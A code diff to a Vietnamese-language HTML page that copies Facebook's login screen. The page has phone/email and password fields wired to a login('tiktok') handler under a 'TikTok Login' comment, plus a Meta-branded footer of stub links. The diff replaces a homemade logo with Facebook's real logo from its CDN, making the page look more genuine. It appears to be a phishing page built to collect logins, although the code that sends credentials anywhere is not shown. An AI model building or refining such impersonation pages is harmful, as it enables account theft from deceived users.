@@ -39,13 +39,18 @@
             margin: 0 auto;
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            justify-content: center; /* Căn giữa tiêu đề */
+            position: relative;
         }
         .header-title {
             font-size: 20px;
             font-weight: 700;
             color: #1877f2;
             cursor: pointer;
+        }
+        .header-menu {
+            position: absolute;
+            right: 10px;
         }
         .header-menu svg {
             width: 24px;
@@ -117,17 +122,9 @@
             text-align: center;
             margin: 0 0 20px;
         }
-        .custom-logo {
+        .facebook-logo img {
             width: 56px;
             height: 56px;
-            background: #1877f2;
-            border-radius: 50%;
-            display: inline-flex;
-            justify-content: center;
-            align-items: center;
-            color: #fff;
-            font-size: 36px;
-            font-weight: 700;
         }
         input {
             width: 100%;
@@ -291,8 +288,7 @@
         }
         .success-popup-title {
             font-size: 20px;
-            font-weight: 60
-0;
+            font-weight: 600;
             color: #1c1e21;
             margin-bottom: 10px;
         }
@@ -362,7 +358,9 @@
         </div>
         <!-- TikTok Login -->
         <div class="login-container-tiktok">
-            <div class="facebook-logo"><div class="custom-logo">f</div></div>
+            <div class="facebook-logo">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
+            </div>
             <input type="text" id="login-input-tiktok" placeholder="Số di động hoặc email">
             <input type="password" id="password-tiktok" placeholder="Mật khẩu">
             <button class="btn-primary" onclick="login('tiktok')">Đăng nhập</button>
@@ -415,50 +413,50 @@
         <span class="meta-logo">∞ Meta</span>
         <a href="#" onclick="showAbout()">Giới thiệu</a>
         <a href="#" onclick="showHelp()">Trợ giúp</a>
-        <a href="#">Xem thêm</a>
+        <a href="#" onclick="alert('Chuyển đến Xem thêm')">Xem thêm</a>
     </div>
     <footer class="footer">
         <div class="footer-content">
             <div class="footer-links">
-                <a href="#">Tiếng Việt</a>
-                <a href="#">English (US)</a>
-                <a href="#">Español</a>
-                <a href="#">Português (Brasil)</a>
-                <a href="#">Français (France)</a>
-                <a href="#">Deutsch</a>
-                <a href="#">Italiano</a>
-                <a href="#">العربية</a>
-                <a href="#">中文(简体)</a>
-                <a href="#">हिन्दी</a>
+                <a href="#" onclick="alert('Chuyển đến Tiếng Việt')">Tiếng Việt</a>
+                <a href="#" onclick="alert('Chuyển đến English (US)')">English (US)</a>
+                <a href="#" onclick="alert('Chuyển đến Español')">Español</a>
+                <a href="#" onclick="alert('Chuyển đến Português (Brasil)')">Português (Brasil)</a>
+                <a href="#" onclick="alert('Chuyển đến Français (France)')">Français (France)</a>
+                <a href="#" onclick="alert('Chuyển đến Deutsch')">Deutsch</a>
+                <a href="#" onclick="alert('Chuyển đến Italiano')">Italiano</a>
+                <a href="#" onclick="alert('Chuyển đến العربية')">العربية</a>
+                <a href="#" onclick="alert('Chuyển đến 中文(简体)')">中文(简体)</a>
+                <a href="#" onclick="alert('Chuyển đến हिन्दी')">हिन्दी</a>
             </div>
             <div class="footer-links">
                 <a onclick="showLogin()">Đăng nhập</a>
                 <a onclick="showCreateAccount()">Đăng ký</a>
-                <a onclick="alert('Chuyển đến Messenger')">Messenger</a>
-                <a onclick="alert('Chuyển đến Facebook Lite')">Facebook Lite</a>
-                <a onclick="alert('Chuyển đến Watch')">Watch</a>
-                <a onclick="alert('Chuyển đến Địa điểm')">Địa điểm</a>
-                <a onclick="alert('Chuyển đến Trò chơi')">Trò chơi</a>
-                <a onclick="alert('Chuyển đến Marketplace')">Marketplace</a>
-                <a onclick="alert('Chuyển đến Meta Pay')">Meta Pay</a>
-                <a onclick="alert('Chuyển đến Meta Store')">Meta Store</a>
-                <a onclick="alert('Chuyển đến Meta Quest')">Meta Quest</a>
-                <a onclick="alert('Chuyển đến Instagram')">Instagram</a>
-                <a onclick="alert('Chuyển đến Threads')">Threads</a>
-                <a onclick="alert('Chuyển đến Quyên góp')">Quyên góp</a>
-                <a onclick="alert('Chuyển đến Dịch vụ')">Dịch vụ</a>
-                <a onclick="alert('Chuyển đến Trung tâm thông tin bầu cử')">Trung tâm thông tin bầu cử</a>
-                <a onclick="alert('Chuyển đến Chính sách quyền riêng tư')">Chính sách quyền riêng tư</a>
-                <a onclick="alert('Chuyển đến Trung tâm quyền riêng tư')">Trung tâm quyền riêng tư</a>
-                <a onclick="alert('Chuyển đến Nhóm')">Nhóm</a>
+                <a href="#" onclick="alert('Chuyển đến Messenger')">Messenger</a>
+                <a href="#" onclick="alert('Chuyển đến Facebook Lite')">Facebook Lite</a>
+                <a href="#" onclick="alert('Chuyển đến Watch')">Watch</a>
+                <a href="#" onclick="alert('Chuyển đến Địa điểm')">Địa điểm</a>
+                <a href="#" onclick="alert('Chuyển đến Trò chơi')">Trò chơi</a>
+                <a href="#" onclick="alert('Chuyển đến Marketplace')">Marketplace</a>
+                <a href="#" onclick="alert('Chuyển đến Meta Pay')">Meta Pay</a>
+                <a href="#" onclick="alert('Chuyển đến Meta Store')">Meta Store</a>
+                <a href="#" onclick="alert('Chuyển đến Meta Quest')">Meta Quest</a>
+                <a href="#" onclick="alert('Chuyển đến Instagram')">Instagram</a>
+                <a href="#" onclick="alert('Chuyển đến Threads')">Threads</a>
+                <a href="#" onclick="alert('Chuyển đến Quyên góp')">Quyên góp</a>
+                <a href="#" onclick="alert('Chuyển đến Dịch vụ')">Dịch vụ</a>
+                <a href="#" onclick="alert('Chuyển đến Trung tâm thông tin bầu cử')">Trung tâm thông tin bầu cử</a>
+                <a href="#" onclick="alert('Chuyển đến Chính sách quyền riêng tư')">Chính sách quyền riêng tư</a>
+                <a href="#" onclick="alert('Chuyển đến Trung tâm quyền riêng tư')">Trung tâm quyền riêng tư</a>
+                <a href="#" onclick="alert('Chuyển đến Nhóm')">Nhóm</a>
                 <a onclick="showAbout()">Giới thiệu</a>
-                <a onclick="alert('Chuyển đến Tạo quảng cáo')">Tạo quảng cáo</a>
-                <a onclick="alert('Chuyển đến Tạo Trang')">Tạo Trang</a>
-                <a onclick="alert('Chuyển đến Nhà phát triển')">Nhà phát triển</a>
-                <a onclick="alert('Chuyển đến Tuyển dụng')">Tuyển dụng</a>
-                <a onclick="alert('Chuyển đến Cookie')">Cookie</a>
-                <a onclick="alert('Chuyển đến Lựa chọn quảng cáo')">Lựa chọn quảng cáo</a>
-                <a onclick="alert('Chuyển đến Điều khoản')">Điều khoản</a>
+                <a href="#" onclick="alert('Chuyển đến Tạo quảng cáo')">Tạo quảng cáo</a>
+                <a href="#" onclick="alert('Chuyển đến Tạo Trang')">Tạo Trang</a>
+                <a href="#" onclick="alert('Chuyển đến Nhà phát triển')">Nhà phát triển</a>
+                <a href="#" onclick="alert('Chuyển đến Tuyển dụng')">Tuyển dụng</a>
+                <a href="#" onclick="alert('Chuyển đến Cookie')">Cookie</a>
+                <a href="#" onclick="alert('Chuyển đến Lựa chọn quảng cáo')">Lựa chọn quảng cáo</a>
+                <a href="#" onclick="alert('Chuyển đến Điều khoản')">Điều khoản</a>
                 <a onclick="showHelp()">Trợ giúp</a>
             </div>
             <div class="footer-meta">Meta © 2025</div>
